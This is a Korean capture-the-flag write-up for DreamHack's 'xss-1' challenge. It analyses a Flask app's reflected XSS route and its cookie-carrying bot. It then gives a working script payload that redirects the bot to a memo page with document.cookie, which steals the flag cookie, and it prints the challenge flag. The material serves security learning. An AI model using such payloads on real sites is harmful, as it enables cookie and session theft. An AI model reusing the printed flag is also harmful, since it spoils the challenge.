# [DreamHack] xss-1

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다.
> XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.
>
> Release: [xss-1.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8534186/xss-1.zip)

## Analysis

### index()

```python
@app.route("/")
def index():
    return render_template("index.html")
```

### vuln()

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # GET으로 param 변수에 값을 받아옴
    return param # param을 반환
```

`param` 변수에 스크립트를 넣으면 그 스크립트가 실행된다.

### read_url()

```python
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie) # 인자로 받은 cookie를 설정
        driver.get(url) # 인자로 받은 url에 접속 요청
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True
```

인자로 받은 `url`에 서버에서 접속 요청을 보낸다. 이 함수로 `url`에 접속하면 SOP를 우회할 수 있다.

### check_xss()

```python
def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}" # param을 URL 인코딩해서 /vuln에 GET으로 전달
    return read_url(url, cookie)
```

인자로 받은 `param`을 GET 변수로 설정하고, 인자로 받은 `cookie`를 설정해서 서버에서 `/vuln`에 접속 요청을 보낸다.

### flag()

```python
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param") # GET으로 param 변수에 값을 받아옴
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}): # 'flag' 쿠키를 설정하여 /vuln?param={param}에 접속 요청
            return '<script>alert("wrong??");history.go(-1);</script>' # 접속 요청이 실패하면 "wrong??" 창을 띄우고 이전 페이지로 돌아감

        return '<script>alert("good");history.go(-1);</script>' # 접속 요청이 성공하면 "good" 창을 띄우고 이전 페이지로 돌아감
```

### memo()

```python
memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "") # GET으로 text 변수에 값을 받아옴
    memo_text += text + "\n" # 받아온 memo는 memo_text에 한 줄씩 더해짐
    return render_template("memo.html", memo=memo_text) # 지금까지 쌓인 memo_text를 출력
```

## Exploit

목표는 서버에서 `/memo?memo=<flag>`의 형식으로 요청을 보내게 해서 `memo_text`에 플래그가 들어가도록 만드는 것이다. `param`에 `<script>document.location.href='/memo?memo=<flag>'</script>`의 형식으로 넣으면 `<flag>`가 `memo_text`에 들어가게 된다.

`flag()`에서 `check_xss()`를 호출할 때 쿠키에 플래그를 넣어서 요청을 보내기 때문에 `<script>document.location.href='/memo?memo='+document.cookie</script>`를 넣으면 된다.

![image](https://user-images.githubusercontent.com/102066383/162620918-2e4f1419-5408-46e8-85c3-ea44f7b7229a.png)

입력하고 제출하면

![image](https://user-images.githubusercontent.com/102066383/162620938-5926bcf2-df1e-4b88-9ac5-79114da9b331.png)

good이 뜨고, `/memo`에 들어가보면 

![image](https://user-images.githubusercontent.com/102066383/162620963-6b4bdc45-20f7-4d8f-81b7-f69c2855e2d8.png)

플래그를 획득할 수 있다.

```
flag: DH{2c01577e9542ec24d68ba0ffb846508e}
```